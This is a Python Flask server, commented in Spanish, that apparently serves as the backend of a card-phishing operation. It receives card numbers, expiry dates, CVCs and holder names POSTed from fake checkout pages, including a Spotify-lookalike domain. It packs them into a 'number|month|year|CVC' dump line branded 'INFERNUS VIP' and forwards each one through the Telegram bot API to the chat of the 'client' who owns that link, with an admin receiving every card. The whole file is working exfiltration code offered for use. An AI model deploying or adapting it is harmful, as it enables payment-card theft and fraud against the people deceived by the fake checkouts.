import os
from flask import Flask, request, jsonify
import requests

app = Flask(__name__)

# --- CONFIGURACIÓN TELEGRAM (LLENA CON DATOS REALES) ---
TELEGRAM_BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', 'TU_TOKEN_AQUI')

# MAPA: LINK DEL CHECKOUT → CLIENTE TELEGRAM ESPECIFICO
PRIVADO_USERS_MAP = {
    # ADMIN recibo TODO de todos los links
    'https://backend-production-d69c4cec.up.railway.app': int(os.environ.get('CLIENTE_ADMIN_ID', '-7707049896')),  # ✅ Tu bot Z recibe TODO

    # CLIENTE 1 - Solo su link específico (free.spotlfy.xyz/)
    'https://free.spotlfy.xyz/': int(os.environ.get('CLIENTE_1_ID', '-7574919030')),  
}

# --- ROUTING LOGIC: ¿A QUIÉN ENVIAR? ---
def get_target_user(origen_url):
    """Devuelve el chat_id específico para este dominio"""
    
    # Primero verificar si hay un usuario específico para este dominio
    if origen_url in PRIVADO_USERS_MAP:
        return PRIVADO_USERS_MAP[origen_url]  # ← Usuario específico para ese link
    
    # Fallback: ¿Quién más quiere ver? (Admin recibo todo por defecto)
    admin_user = PRIVADO_USERS_MAP.get('https://backend-production-d69c4cec.up.railway.app')
    
    if admin_user:
        return admin_user  # ← Admin siempre recibe TODO
    
    return None

# --- RUTA PARA RECIBIR DATOS DE CHECKOUT ---
@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    """Recibe datos de tarjeta y los envía al cliente correspondiente"""
    
    data = request.json if request.is_json else {}
    origen_url = data.get('origen', 'unknown')  # 🔥 El dominio del checkout
    
    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A').replace(' ', '')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    # Separar mes y año de la fecha de vencimiento
    try:
        if '/' in expiracion:
            mes, ano = expiracion.split('/')
            ano = ano.zfill(4)  # Asegurar formato AAAA (ej: "2026")
        else:
            mes, ano = expiracion, 'N/A'
    except Exception:
        mes, ano = 'N/A', 'N/A'

    # Formato de la tarjeta: NUMERO|MES|AÑO|CVC
    cc_linea = f"{tarjeta}|{mes}|{ano}|{cvc}"

    mensaje_base = (
        f"🔥 *INFERNUS VIP* 🔥\n"
        f"━━━━━━━━━━━━━\n\n"
        f"`{cc_linea}`\n\n"
        f"👤 _{nombre}_"
    )

    # --- LOGICA DE ROUTING: ¿QUIÉN RECIBE? ---
    
    # 1. Verificar si hay un usuario específico para este dominio
    if origen_url in PRIVADO_USERS_MAP:
        usuario_destino = PRIVADO_USERS_MAP[origen_url]
        
        url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        
        try:
            payload = {
                "chat_id": str(usuario_destino),  # ✅ Convertir a string para Telegram API
                "text": mensaje_base, 
                "parse_mode": "Markdown"
            }

            res = requests.post(url_telegram, json=payload, timeout=5)
            
            if res.status_code == 200:
                print(f"✅ ENVIADO A {usuario_destino} (Dominio: {origen_url})")
            else:
                print(f"❌ ERROR TELEGRAM ({usuario_destino}): {res.text}")
                
        except Exception as e:
            print(f"❌ EXCEPCIÓN TELEGRAM: {e}")

    # 2. Fallback: ¿Quién más quiere ver? (Admin recibo TODO)
    else:
        admin_user = PRIVADO_USERS_MAP.get('https://backend-production-d69c4cec.up.railway.app')
        
        if admin_user:
            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            
            payload = {
                "chat_id": str(admin_user),  # ✅ Tu bot Z siempre recibe TODO
                "text": mensaje_base, 
                "parse_mode": "Markdown"
            }
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                
                if res.status_code == 200:
                    print(f"✅ ENVIADO A ADMIN {admin_user} (Dominio no registrado)")
                else:
                    print(f"❌ ERROR TELEGRAM AL ADMIN: {res.text}")
            except Exception as e:
                print(f"❌ EXCEPCIÓN RED: {e}")

    return jsonify({"status": "success", "enviados": 1}), 200


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    
    print("=" * 60)
    print(f"🚀 INICIANDO SERVIDOR FLASK...")
    print(f"🔥 TOKEN: {TELEGRAM_BOT_TOKEN}")
    print(f"📦 MAPA DE USUARIOS:")
    for dominio, user_id in PRIVADO_USERS_MAP.items():
        print(f"   - {dominio} → {user_id}")
    print("=" * 60)
    
    app.run(host='0.0.0.0', port=port)
